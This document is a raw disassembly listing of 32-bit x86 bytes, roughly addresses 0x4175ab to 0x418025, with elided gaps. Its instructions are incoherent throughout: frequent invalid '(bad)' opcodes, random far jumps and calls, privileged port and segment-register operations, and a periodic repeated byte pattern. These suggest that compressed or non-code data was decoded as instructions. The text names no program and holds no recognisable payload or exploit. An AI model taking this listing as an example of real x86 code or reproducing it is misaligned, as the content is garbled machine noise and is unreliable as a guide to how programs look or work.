  4175ab:	dec    edx
  4175ac:	test   eax,0xf3b03b0e
  4175b1:	jne    0x4175f9
  4175b3:	adc    dl,BYTE PTR [esi+0x0]
	...
  417616:	test   eax,0xdf4fd367
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fdivr  DWORD PTR [ebx-0xfc5def1]
  417627:	hlt    
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [esi+0x1b9914ae],al
  417633:	call   0x3fe6:0xfb9a1e51
  41763a:	mov    ds,WORD PTR [edx]
  41763c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41763d:	in     al,0x7f
  41763f:	push   edi
  417640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417641:	jnp    0x41765d
  417643:	inc    ebp
  417644:	add    eax,0x933aa7a0
  417649:	(bad)  
  41764a:	retw   0x9ba8
  41764e:	mov    dh,0xa3
  417650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417651:	scas   al,BYTE PTR es:[edi]
  417652:	push   edx
  417653:	aad    0xb3
  417655:	sti    
  417656:	pop    ebx
  417657:	jp     0x417676
  417659:	cmp    ebx,DWORD PTR [ecx-0x3e]
  41765c:	stos   BYTE PTR es:[edi],al
  41765d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41765e:	sbb    edx,DWORD PTR [edx-0x29]
  417661:	cdq    
  417662:	ins    BYTE PTR es:[edi],dx
  417663:	sbb    ebp,ebx
  417665:	cmp    eax,0xf9d315d7
  41766a:	das    
  41766b:	out    0x5b,eax
  41766d:	mov    eax,DWORD PTR [esi+0x54]
  417670:	or     BYTE PTR [ecx],cl
  417672:	ret    
  417673:	push   edx
  417674:	mov    cl,0xad
  417676:	cmp    eax,0xc1457bcd
  41767b:	scas   eax,DWORD PTR es:[edi]
  41767c:	pop    ss
  41767d:	add    ah,dl
  41767f:	dec    ecx
  417680:	retf   0xe0d8
  417683:	mov    bl,0xc8
  417685:	arpl   WORD PTR [ebx+0x1f],bx
  417688:	cli    
  417689:	ficomp WORD PTR [ecx-0x35]
  41768c:	fstp   TBYTE PTR [edi]
  41768e:	ins    BYTE PTR es:[edi],dx
  41768f:	and    BYTE PTR [ebx+0x6b71fb85],0xcf
  417696:	mov    ?,WORD PTR [esi-0x2dc4756c]
  41769c:	xor    DWORD PTR [esi],eax
  41769e:	pop    edi
  41769f:	inc    esp
  4176a0:	aaa    
  4176a1:	inc    edi
  4176a2:	test   eax,0xa95d5122
  4176a7:	sbb    esp,DWORD PTR [edx]
  4176a9:	cli    
  4176aa:	push   ds
  4176ab:	sub    edi,0x35
  4176ae:	not    BYTE PTR [edx*4+0x6ba22fd5]
  4176b5:	jno    0x417703
  4176b7:	lods   eax,DWORD PTR ds:[esi]
  4176b8:	sub    DWORD PTR [eax+ecx*2],edx
  4176bb:	jmp    0x746f:0xb57ec125
  4176c2:	aam    0x4b
  4176c4:	lea    edi,[eax]
  4176c6:	sbb    edi,DWORD PTR [ebp-0x13]
  4176c9:	lea    esi,ds:0xad68454d
  4176cf:	push   DWORD PTR [edi-0x31943cf5]
  4176d5:	sbb    eax,0x5ed859c4
  4176da:	(bad)  
  4176db:	(bad)  
  4176dc:	ins    BYTE PTR es:[edi],dx
  4176dd:	shr    BYTE PTR [ebx+0x4f],0xc0
  4176e1:	mov    edi,0x7b3a4ce8
  4176e6:	mov    dl,0xb8
  4176e8:	retf   
  4176e9:	add    BYTE PTR [ecx+ebp*4-0x6b],bl
  4176ed:	aad    0x5d
  4176ef:	out    dx,al
  4176f0:	inc    eax
  4176f1:	repnz dec ebx
  4176f3:	pop    esp
  4176f4:	mov    ebx,0xc5c2f1e9
  4176f9:	xchg   ah,ah
  4176fb:	imul   ecx,ebp,0x45
  4176fe:	mov    edx,0xb461139f
  417703:	dec    esi
  417704:	adc    eax,0x99760d20
  417709:	mov    ecx,0xd66a86d1
  41770e:	test   eax,0xccb9df71
  417713:	jo     0x41770f
  417715:	imul   edx,DWORD PTR [esi+0x8a66136],0x8e8125ce
  41771f:	inc    edi
  417720:	jne    0x417775
  417722:	int3   
  417723:	imul   edx,DWORD PTR ds:0xbe0c8aea,0x1c
  41772a:	and    BYTE PTR [esi+0x503b9f93],al
  417730:	dec    ebx
  417731:	outs   dx,BYTE PTR ds:[esi]
  417732:	call   0x0:0xa4e3
	...
  417795:	add    cl,ch
  417797:	push   cs
  417798:	(bad)  
  417799:	pop    ss
  41779a:	push   edi
  41779c:	jmp    0xebcb2f9f
  4177a1:	sbb    esi,ebx
  4177a3:	repz inc DWORD PTR [edi-0x9]
  4177a7:	cmc    
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    BYTE PTR [ecx+0x5829e62b],bl
  4177b3:	sub    dl,BYTE PTR [ebp+0x4c]
  4177b6:	call   0x4a94:0x654b8c3d
  4177bd:	inc    edx
  4177be:	shl    DWORD PTR [edx+0x2a],0xa9
  4177c2:	popa   
  4177c3:	inc    edi
  4177c4:	aaa    
  4177c5:	or     BYTE PTR [ebp-0x598a561],bl
  4177cb:	cwde   
  4177cc:	ret    
  4177cd:	or     dl,BYTE PTR [ecx]
  4177cf:	jecxz  0x41784a
  4177d1:	sti    
  4177d2:	fimul  DWORD PTR [ebp+0x25]
  4177d5:	mov    esp,0xf569e922
  4177da:	rcl    DWORD PTR [ebx-0x673dfdb7],cl
  4177e0:	stos   DWORD PTR es:[edi],eax
  4177e1:	adc    eax,0xff123888
  4177e6:	and    edx,DWORD PTR [ecx-0x3a]
  4177e9:	mov    edi,0x8b65efca
  4177ee:	push   ebx
  4177ef:	pop    ss
  4177f0:	popa   
  4177f1:	cld    
  4177f2:	xor    esi,DWORD PTR [edx]
  4177f4:	scas   eax,DWORD PTR es:[edi]
  4177f5:	(bad)  
  4177f6:	xor    al,0x85
  4177f8:	out    dx,eax
  4177f9:	jb     0x41779c
  4177fb:	fidiv  WORD PTR [eax+0x175e994e]
  417801:	ds push ds
  417803:	fs and eax,0x4ef648aa
  417809:	pop    ebp
  41780a:	and    DWORD PTR [edi-0x44],0x23
  41780e:	sub    eax,0xf38eac3c
  417813:	inc    ecx
  417814:	(bad)  
  417815:	(bad)  
  417816:	cmp    cl,al
  417818:	in     eax,0x2c
  41781a:	fstp   DWORD PTR [esi+0x6fa3723b]
  417820:	in     al,0xbb
  417822:	xchg   esp,eax
  417823:	(bad)  
  417824:	sti    
  417825:	scas   eax,DWORD PTR es:[edi]
  417826:	mov    esp,0x5cb5cbdc
  41782b:	xchg   edi,eax
  41782c:	aam    0xa5
  41782e:	mov    cr4,ebx
  417831:	out    0xa9,eax
  417833:	pop    ecx
  417834:	jne    0x41789d
  417836:	fbstp  TBYTE PTR [edx]
  417838:	ds cdq 
  41783a:	and    DWORD PTR [ebp+0xe026647],edx
  417840:	fdivr  st(4),st
  417842:	xor    eax,0xc97780ae
  417847:	mov    eax,fs:0x67cedab1
  41784d:	sbb    BYTE PTR [eax+0x236f3325],ah
  417853:	xchg   ebp,eax
  417854:	xchg   ecx,eax
  417855:	mov    DWORD PTR [esi],eax
  417857:	call   0x554a1412
  41785c:	les    eax,FWORD PTR [eax]
  41785e:	daa    
  41785f:	jae    0x4178c0
  417861:	mov    ah,0xfa
  417863:	sbb    ch,0x61
  417866:	jle    0x4178a2
  417868:	mov    ds:0xca95bf5e,eax
  41786d:	out    dx,eax
  41786e:	xchg   esi,eax
  41786f:	scas   eax,DWORD PTR es:[edi]
  417870:	sub    BYTE PTR [ebp+0x16aecafe],ch
  417876:	and    eax,0xc851f932
  41787b:	mov    eax,ds:0x4a7f57f6
  417880:	pop    esi
  417881:	cmp    DWORD PTR [ebp-0x41],ecx
  417884:	pop    esi
  417885:	test   ch,bh
  417887:	push   eax
  417888:	addr16 push 0x6d
  41788b:	pop    ss
  41788c:	xchg   edx,eax
  41788d:	jle    0x4178f8
  41788f:	jmp    0x4178b7
  417891:	sub    DWORD PTR [edi],0xffffffe6
  417894:	push   0xffffffdd
  417896:	cld    
  417897:	popf   
  417898:	in     eax,dx
  417899:	jg     0x417855
  41789b:	jae    0x4178bf
  41789d:	add    ebx,DWORD PTR [ecx-0x73]
  4178a0:	loop   0x4178b3
  4178a2:	adc    eax,0x29e4a98c
  4178a7:	mov    edx,0x9bc3e03d
  4178ac:	ja     0x417843
  4178ae:	jb     0x417919
  4178b0:	xor    BYTE PTR ds:0x8ff254,cl
	...
  417916:	pop    eax
  417917:	inc    ecx
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0x7c60e3bb
  417923:	mov    edi,0xf6fe3d23
  417928:	add    BYTE PTR [eax],al
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    ah,cl
  41792f:	mov    eax,0x8a5b34d4
  417934:	popf   
  417935:	jge    0x4178ff
  417937:	push   esp
  417938:	xor    al,0xc2
  41793a:	in     al,0xf1
  41793c:	inc    edi
  41793d:	add    BYTE PTR [ecx-0x16e71e92],0x3d
  417944:	jmp    0x6104:0x70c21ef7
  41794b:	outs   dx,BYTE PTR ds:[esi]
  41794c:	mov    esp,0xe116487b
  417951:	aas    
  417952:	push   ecx
  417953:	sub    edx,ebx
  417955:	add    DWORD PTR [esi-0x313f2383],eax
  41795b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41795c:	adc    ebp,DWORD PTR [eax+ebx*4-0x68c8c4f5]
  417963:	xchg   ecx,eax
  417964:	xchg   edi,eax
  417965:	xor    ah,bl
  417967:	enter  0xcbc2,0x2c
  41796b:	repz sub DWORD PTR [edx+0xc],eax
  41796f:	adc    ecx,edx
  417971:	dec    ebp
  417972:	les    edx,FWORD PTR [esi]
  417974:	ja     0x41799c
  417976:	pop    ds
  417977:	ja     0x4179f2
  417979:	imul   edx,DWORD PTR [ebx+0x1a],0xd22cd31c
  417980:	retf   
  417981:	shl    ch,1
  417983:	inc    edi
  417984:	jae    0x417957
  417986:	call   0x50f3:0xd2ebf102
  41798d:	ficomp WORD PTR [edx]
  41798f:	jns    0x4179e9
  417991:	sti    
  417992:	mov    ecx,0x10e229a
  417997:	push   es
  417998:	adc    esp,DWORD PTR [ebp-0x729d8800]
  41799e:	int    0xcd
  4179a0:	lods   al,BYTE PTR ds:[esi]
  4179a1:	out    dx,al
  4179a2:	lds    esi,FWORD PTR [edx*1-0x6cc42bf9]
  4179a9:	or     BYTE PTR [edx-0x22],0x1a
  4179ad:	sub    al,0x52
  4179af:	and    eax,0xe3670530
  4179b4:	test   al,0x65
  4179b6:	mov    eax,0x1a7d0386
  4179bb:	jle    0x4179b4
  4179bd:	jbe    0x417999
  4179bf:	bound  eax,QWORD PTR [ebx+0x2a]
  4179c2:	adc    DWORD PTR ds:0x5e47caf4,0x4f
  4179c9:	push   0x126028a9
  4179ce:	xor    eax,0x72a68f94
  4179d3:	push   es
  4179d4:	cs push eax
  4179d6:	retf   0x8087
  4179d9:	mov    ebx,0xc7f49830
  4179de:	ins    DWORD PTR es:[edi],dx
  4179df:	pop    ebx
  4179e0:	xchg   esp,eax
  4179e1:	pop    edi
  4179e2:	jmp    0xbae4:0x25f80f77
  4179e9:	pop    edi
  4179ea:	mov    al,0x3f
  4179ec:	imul   esp,DWORD PTR [eax+eiz*4],0xffffffaa
  4179f0:	jno    0x4179a4
  4179f2:	and    eax,0xf2de254
  4179f7:	or     ah,BYTE PTR [ebx+0x69]
  4179fa:	cmc    
  4179fb:	mov    bl,0xda
  4179fd:	fdecstp 
  4179ff:	cld    
  417a00:	sbb    BYTE PTR [eax+0x68],bl
  417a03:	test   DWORD PTR [edx],ecx
  417a05:	sub    BYTE PTR [ebp+0x66],ch
  417a08:	mov    cl,0x83
  417a0a:	out    dx,al
  417a0b:	mov    al,ds:0xea7721df
  417a10:	xor    al,0x29
  417a12:	test   cl,dl
  417a14:	and    al,0xf
  417a16:	push   esi
  417a17:	mov    cs,esp
  417a19:	mov    eax,0xef07db51
  417a1e:	jge    0x417a0e
  417a20:	jmp    0x710c:0x39be0451
  417a27:	rcl    BYTE PTR [ebx-0x74289ab8],1
  417a2d:	push   edx
  417a2e:	xchg   edx,esi
  417a30:	mov    esp,0x615634fe
	...
  417a95:	add    BYTE PTR [edi],ch
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx-0x78]
  417aa3:	cmp    ecx,ebp
  417aa5:	add    DWORD PTR ds:0x70000f8,0x1
  417aac:	add    BYTE PTR [eax],al
  417aae:	and    eax,0xaee7f4dd
  417ab3:	xchg   DWORD PTR fs:0x539de2d2,ebx
  417aba:	(bad)  
  417abb:	jle    0x417b14
  417abd:	in     al,dx
  417abe:	popa   
  417abf:	mov    ah,0x73
  417ac1:	call   0xd0bd3f91
  417ac6:	pop    ecx
  417ac7:	sub    ch,BYTE PTR [edi+edx*1]
  417aca:	xchg   esp,eax
  417acb:	pop    ds
  417acc:	jg     0x417acc
  417ace:	mov    WORD PTR ds:0x349cf70e,cs
  417ad4:	or     cl,BYTE PTR [ecx+0xfadcfed]
  417ada:	mov    ebx,0x57f9563e
  417adf:	adc    eax,0xd69e9206
  417ae4:	inc    esp
  417ae5:	mov    ecx,0x3ab1da02
  417aea:	in     eax,dx
  417aeb:	or     BYTE PTR [ebx+edi*1],cl
  417aee:	inc    ebx
  417aef:	pop    eax
  417af0:	push   edi
  417af1:	fld    st(7)
  417af3:	sub    ch,BYTE PTR [ebp+0x407de26]
  417af9:	mov    ds:0x9db31f74,eax
  417afe:	in     eax,0x16
  417b00:	enter  0xc391,0xec
  417b04:	fnstsw WORD PTR [ecx+ecx*2+0x41]
  417b08:	push   ebx
  417b09:	xchg   esp,eax
  417b0a:	cmc    
  417b0b:	loop   0x417b4b
  417b0d:	(bad)  
  417b0e:	jmp    0xa69a:0x40632a9d
  417b15:	fmul   DWORD PTR [esi+esi*4+0x5b]
  417b19:	mov    edi,0xecc9dcee
  417b1e:	inc    ecx
  417b1f:	jbe    0x417aca
  417b21:	popa   
  417b22:	push   ebp
  417b23:	adc    BYTE PTR [ebx],cl
  417b25:	neg    eax
  417b27:	pop    ebx
  417b28:	imul   edi,DWORD PTR [eax+0x37ac6aaf],0x78c02656
  417b32:	sbb    BYTE PTR [edi],0x9f
  417b35:	sub    BYTE PTR [eax+ecx*2-0x764149d8],0xab
  417b3d:	rcl    DWORD PTR [edx],1
  417b3f:	aas    
  417b40:	sbb    DWORD PTR [eax],edi
  417b42:	mov    edi,0xab20d7cc
  417b47:	into   
  417b48:	sub    eax,0x25fff698
  417b4d:	je     0x417ada
  417b4f:	mov    dl,0x4d
  417b51:	push   ss
  417b52:	mov    ebx,0x153233a5
  417b57:	fisub  WORD PTR [ebp+edx*1+0x78436c76]
  417b5e:	mov    ah,0x35
  417b60:	(bad)  
  417b61:	outs   dx,BYTE PTR ds:[esi]
  417b62:	into   
  417b63:	xor    BYTE PTR [ebx],0x53
  417b66:	repz cwde 
  417b68:	fcom   DWORD PTR ds:0xa283390d
  417b6e:	retf   
  417b6f:	or     DWORD PTR [ebx-0x1ff7c585],eax
  417b75:	inc    ebp
  417b76:	ss in  al,dx
  417b78:	int3   
  417b79:	inc    DWORD PTR [edi+0x2f89d4d5]
  417b7f:	xlat   BYTE PTR ds:[ebx]
  417b80:	ja     0x417b7c
  417b82:	mov    dh,0x57
  417b84:	mov    BYTE PTR ss:[ecx-0x34],bl
  417b88:	sub    edx,edx
  417b8a:	pop    eax
  417b8b:	inc    esi
  417b8c:	push   cs
  417b8d:	mul    DWORD PTR [ebx+0x6d]
  417b90:	(bad)  
  417b91:	imul   esp,DWORD PTR [edx],0xffffff84
  417b94:	enter  0xf538,0x8e
  417b98:	push   ecx
  417b99:	mov    esp,0xf2a84a2a
  417b9e:	or     BYTE PTR [edx+0x71],al
  417ba1:	add    eax,0xe64d644c
  417ba6:	push   esp
  417ba7:	push   ebx
  417ba8:	or     ebx,ebp
  417baa:	dec    esi
  417bab:	fnstsw WORD PTR [esi-0x112878a7]
  417bb1:	jge    0x417c03
  417bb3:	subps  xmm0,XMMWORD PTR [eax]
	...
  417c16:	mov    eax,eax
  417c18:	nop
  417c19:	test   cl,bl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0xc2
  417c23:	out    0x2f,al
  417c25:	ror    BYTE PTR [ecx+edi*8],cl
  417c28:	add    BYTE PTR [eax],al
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [eax],bh
  417c2f:	mov    dh,0x77
  417c31:	les    edx,FWORD PTR [edi-0x78e96df7]
  417c37:	inc    edi
  417c38:	fiadd  DWORD PTR [esi-0xb9f0f28]
  417c3e:	test   BYTE PTR [ecx+0x4b],bh
  417c41:	push   es
  417c42:	ret    0x47b2
  417c45:	push   ds
  417c46:	jne    0x417c0d
  417c48:	fcomi  st,st(1)
  417c4a:	inc    eax
  417c4b:	jb     0x417c8f
  417c4d:	out    dx,eax
  417c4e:	and    al,BYTE PTR [ebp+0x38]
  417c51:	sub    ebx,ebx
  417c53:	je     0x417c49
  417c55:	xchg   DWORD PTR [ebx-0x1d],ebp
  417c58:	xor    bh,BYTE PTR [edi]
  417c5a:	sbb    al,al
  417c5c:	pop    ecx
  417c5d:	(bad)  
  417c5e:	push   edx
  417c5f:	jb     0x417c35
  417c61:	stos   DWORD PTR es:[edi],eax
  417c62:	mov    ds:0xd52df415,eax
  417c67:	push   es
  417c68:	pop    esi
  417c69:	push   cs
  417c6a:	mov    esp,0x74e6a06f
  417c6f:	adc    al,0x5d
  417c71:	ins    BYTE PTR es:[edi],dx
  417c72:	sub    ebp,eax
  417c74:	sahf   
  417c75:	arpl   ax,sp
  417c77:	loop   0x417cac
  417c79:	lods   eax,DWORD PTR ds:[esi]
  417c7a:	retf   0xb3a2
  417c7d:	mov    ds:0x862ed584,eax
  417c82:	rol    BYTE PTR [edi],0x84
  417c85:	dec    ebp
  417c86:	daa    
  417c87:	loope  0x417cfb
  417c89:	push   ebp
  417c8a:	cmovae edx,DWORD PTR [ebx]
  417c8d:	jae    0x417c40
  417c8f:	pop    ss
  417c90:	(bad)  
  417c91:	jmp    0x4f67:0xf789adc4
  417c98:	pop    eax
  417c99:	jne    0x417d16
  417c9b:	dec    eax
  417c9c:	pop    esp
  417c9d:	add    dh,BYTE PTR [edx]
  417c9f:	les    ebp,FWORD PTR [ebx]
  417ca1:	adc    eax,0xa285f362
  417ca6:	inc    ebx
  417ca7:	push   cs
  417ca8:	ret    0xc931
  417cab:	retf   0xb42e
  417cae:	xor    eax,DWORD PTR [eax+0x258a42e0]
  417cb4:	jle    0x417d31
  417cb6:	aas    
  417cb7:	clc    
  417cb8:	std    
  417cb9:	sbb    eax,0x701180f4
  417cbe:	std    
  417cbf:	dec    ecx
  417cc0:	stc    
  417cc1:	xchg   ebp,eax
  417cc2:	sbb    edx,esi
  417cc4:	mov    al,ds:0x9b4ffe38
  417cc9:	push   edi
  417cca:	arpl   WORD PTR ds:0xc14f568c,bx
  417cd0:	retf   0xab99
  417cd3:	popa   
  417cd4:	hlt    
  417cd5:	je     0x417d20
  417cd7:	sub    BYTE PTR [ecx+0x58bd6ecb],dh
  417cdd:	xlat   BYTE PTR ds:[ebx]
  417cde:	push   ebx
  417cdf:	or     esp,DWORD PTR [edx+eax*8-0x57451dbb]
  417ce6:	jl     0x417d05
  417ce8:	push   ebp
  417ce9:	shl    BYTE PTR [eax-0x5ff88d1b],cl
  417cef:	jno    0x417cce
  417cf1:	mov    eax,ds:0xf9ec3f8f
  417cf6:	mov    bh,BYTE PTR [ebx]
  417cf8:	(bad)  
  417cf9:	jmp    0xe6e125dd
  417cfe:	loope  0x417c8d
  417d00:	outs   dx,BYTE PTR ds:[esi]
  417d01:	test   DWORD PTR [ecx+0x33285048],esi
  417d07:	xchg   ebx,eax
  417d08:	aas    
  417d09:	and    ebx,ebx
  417d0b:	sbb    al,0x79
  417d0e:	xor    BYTE PTR [edi],cl
  417d10:	imul   ecx,DWORD PTR [ebx-0x311d7e45],0x998e9030
  417d1a:	mov    al,0x6c
  417d1c:	push   edx
  417d1d:	stos   BYTE PTR es:[edi],al
  417d1e:	cli    
  417d1f:	pop    edi
  417d20:	lods   eax,DWORD PTR ds:[esi]
  417d21:	add    cl,BYTE PTR [eiz*4-0x184ca34a]
  417d28:	repz inc ebp
  417d2a:	arpl   WORD PTR [ebp+0x53],ax
  417d2d:	out    0x3c,eax
  417d2f:	push   eax
  417d30:	adc    esp,ebp
  417d32:	loopne 0x417d4a
  417d34:	pop    edi
	...
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0x1
  417da3:	add    eax,0xfa137852
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    BYTE PTR [ebx+0x25],ch
  417db0:	adc    BYTE PTR [eax-0x18ad33e8],dh
  417db6:	mov    al,0x75
  417db8:	dec    eax
  417db9:	jb     0x417dc7
  417dbb:	mov    BYTE PTR [ebx+0x34fae0c3],bh
  417dc1:	dec    esi
  417dc2:	pop    ds
  417dc3:	popf   
  417dc4:	out    dx,al
  417dc5:	or     DWORD PTR [ecx],0xfffffff8
  417dc8:	or     cl,BYTE PTR [ebx+0x6b]
  417dcb:	xor    dh,ch
  417dcd:	jp     0x417dc8
  417dcf:	xor    DWORD PTR [esi+0x30182021],edx
  417dd5:	cld    
  417dd6:	jg     0x417e1a
  417dd8:	fistp  WORD PTR [ebx-0x299657f3]
  417dde:	ja     0x417dcc
  417de0:	sbb    ecx,DWORD PTR [edx+0x29]
  417de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417de4:	xchg   ebp,eax
  417de5:	xchg   edi,eax
  417de6:	push   ebx
  417de7:	or     dh,bh
  417de9:	and    BYTE PTR [edx+0x3b6dcc7d],bh
  417def:	fldcw  WORD PTR [eax+0x201dfb30]
  417df5:	push   sp
  417df7:	mov    ch,0xe0
  417df9:	jne    0x417db7
  417dfb:	leave  
  417dfc:	les    eax,FWORD PTR [eax+0x471d5afb]
  417e02:	push   esp
  417e03:	fwait
  417e04:	sar    BYTE PTR [ecx],1
  417e06:	dec    esi
  417e07:	sbb    al,0x8a
  417e09:	add    BYTE PTR [ecx-0xe],cl
  417e0c:	js     0x417dc6
  417e0e:	xor    edi,DWORD PTR [edx+0x7d]
  417e11:	jb     0x417d94
  417e13:	mov    esi,0xd26cbd55
  417e18:	push   ds
  417e19:	adc    DWORD PTR [ebx+0x53],ebp
  417e1c:	shr    BYTE PTR [ebp+0x4d],0x76
  417e20:	imul   esp,DWORD PTR [ecx+0x7f],0xffffff90
  417e24:	inc    edi
  417e25:	popf   
  417e26:	mov    al,0xba
  417e28:	dec    ebp
  417e29:	xor    al,0x89
  417e2b:	clc    
  417e2c:	add    ch,BYTE PTR [ebp+0x25]
  417e2f:	je     0x417e2c
  417e31:	fild   QWORD PTR [edx-0x10]
  417e34:	dec    ebp
  417e35:	stos   BYTE PTR es:[edi],al
  417e36:	and    ch,dl
  417e38:	xor    BYTE PTR [eax-0xe329958],cl
  417e3e:	cmp    ah,ah
  417e40:	sbb    BYTE PTR [eax-0x77],0x88
  417e44:	rol    DWORD PTR [edx-0x23],1
  417e47:	push   cs
  417e48:	and    ecx,DWORD PTR [edi-0x13669233]
  417e4e:	push   es
  417e4f:	sar    BYTE PTR [edx+0x3354fa8],1
  417e55:	dec    esi
  417e56:	add    DWORD PTR [ebx],ebx
  417e58:	jb     0x417e62
  417e5a:	js     0x417e1b
  417e5c:	and    BYTE PTR [esi],al
  417e5e:	repz jne 0x417dfc
  417e61:	es rol BYTE PTR fs:[eax-0x25d155c6],1
  417e69:	adc    BYTE PTR [ecx-0x67],al
  417e6c:	sbb    DWORD PTR [ebx+0x691bd048],ebp
  417e72:	fld    QWORD PTR [edi]
  417e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e75:	rol    bl,0x1f
  417e78:	test   al,0xf3
  417e7a:	aaa    
  417e7b:	ins    DWORD PTR es:[edi],dx
  417e7c:	pop    eax
  417e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e7e:	sbb    al,0x6e
  417e80:	cli    
  417e81:	neg    BYTE PTR [ebp-0x6b5f764e]
  417e87:	cmp    eax,0xb5c04858
  417e8c:	jne    0x417e54
  417e8e:	and    BYTE PTR [ebx+0x44031dc5],bl
  417e94:	test   eax,0x9a9f8f1d
  417e99:	mov    ebp,0x5fc3726
  417e9e:	inc    ebp
  417e9f:	loope  0x417ec9
  417ea1:	jecxz  0x417eac
  417ea3:	(bad)  
  417ea4:	push   esp
  417ea5:	stc    
  417ea6:	imul   ebx,DWORD PTR [esi-0x18],0x4c847360
  417ead:	push   ebx
  417eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eaf:	fadd   QWORD PTR [edi+ecx*1-0x22]
  417eb3:	ret    0x76
	...
  417f16:	(bad)  
  417f17:	out    0xe6,al
  417f19:	cmp    esp,esi
  417f1b:	cmp    edi,edi
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	inc    ecx
  417f23:	and    BYTE PTR [ebp-0x4c],dh
  417f26:	sbb    bh,bl
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    dl,cl
  417f2f:	sbb    esi,DWORD PTR [eax]
  417f31:	lock lahf 
  417f33:	imul   esp,DWORD PTR [ebx+0x20b6f9a7],0x58
  417f3a:	mov    esp,0x6066f3b
  417f3f:	pop    esi
  417f40:	xchg   ecx,eax
  417f41:	jmp    0x5b0:0x251c5b45
  417f48:	bound  eax,QWORD PTR [edx-0x3439b52e]
  417f4e:	jo     0x417f41
  417f50:	mul    DWORD PTR [edx+0x21]
  417f53:	fnstenv ds:0x4a338ca8
  417f59:	pop    esp
  417f5a:	imul   ebp
  417f5c:	test   DWORD PTR [edi],ecx
  417f5e:	repz into 
  417f60:	es dec esp
  417f62:	push   edi
  417f63:	les    ebp,FWORD PTR [bp-0x3f80]
  417f68:	jb     0x417eeb
  417f6a:	push   ds
  417f6b:	sub    BYTE PTR [esi+ebx*4+0x1c6571ed],ah
  417f72:	(bad)  
  417f73:	mov    eax,ds:0x4e86b68c
  417f78:	dec    edx
  417f79:	cmp    edx,DWORD PTR gs:[ebx]
  417f7c:	sub    al,0x5
  417f7e:	pop    edi
  417f7f:	sub    al,0x5c
  417f81:	lods   eax,DWORD PTR es:[esi]
  417f83:	push   cs
  417f84:	jae    0x417f70
  417f86:	jmp    0x22b5ab15
  417f8b:	ins    DWORD PTR es:[edi],dx
  417f8c:	push   ecx
  417f8d:	cmovae edx,ebp
  417f90:	add    BYTE PTR [ecx+0x29],dh
  417f93:	sbb    al,0xbd
  417f95:	scas   al,BYTE PTR es:[edi]
  417f96:	push   ds
  417f97:	and    DWORD PTR [esp+ebp*8-0x16],edi
  417f9b:	stos   BYTE PTR es:[edi],al
  417f9c:	enter  0x908f,0xff
  417fa0:	pop    ss
  417fa1:	in     eax,0x4b
  417fa3:	mov    al,0xd0
  417fa5:	aas    
  417fa6:	int    0x5a
  417fa8:	push   edx
  417fa9:	int    0x1b
  417fab:	pusha  
  417fac:	add    BYTE PTR [eax],ah
  417fae:	and    al,0xed
  417fb0:	jp     0x417f53
  417fb2:	and    eax,esp
  417fb4:	and    al,0x2c
  417fb6:	jg     0x417fea
  417fb8:	push   edx
  417fb9:	jge    0x417f4f
  417fbb:	jg     0x417f58
  417fbd:	sbb    eax,DWORD PTR [esi-0x237afac6]
  417fc3:	dec    edi
  417fc4:	call   0xeee3:0x129a08ca
  417fcb:	push   0xffffffc2
  417fcd:	pop    edx
  417fce:	pop    eax
  417fcf:	cs inc esp
  417fd1:	jmp    0x2d3e:0xb2ed0a6b
  417fd8:	xchg   ecx,eax
  417fd9:	or     BYTE PTR [ecx],bl
  417fdb:	sub    BYTE PTR [ebx+0x71fdc9c7],0xb8
  417fe2:	push   cs
  417fe3:	fiadd  WORD PTR [ebx]
  417fe5:	pop    esi
  417fe6:	push   ss
  417fe7:	adc    DWORD PTR [esi+0x7d],eax
  417fea:	ins    BYTE PTR es:[edi],dx
  417feb:	mov    al,ds:0x5cab70be
  417ff0:	sub    al,0x18
  417ff2:	dec    edx
  417ff3:	or     al,0xc6
  417ff5:	cdq    
  417ff6:	ret    
  417ff7:	cs push cs
  417ff9:	adc    BYTE PTR [ecx-0x15778393],ah
  417fff:	push   0x291f0283
  418004:	loop   0x418040
  418006:	jmp    0xe0ed:0x732b8f85
  41800d:	sub    eax,DWORD PTR [edx+eiz*1+0x64]
  418011:	fisub  WORD PTR [esi+0x757bee57]
  418017:	outs   dx,BYTE PTR ds:[esi]
  418018:	add    ebx,DWORD PTR [esi+0x65826918]
  41801e:	int3   
  41801f:	sbb    al,0xe
  418021:	add    DWORD PTR [edi],edi
  418023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418024:	ins    DWORD PTR es:[edi],dx
  418025:	in     eax,0x8b
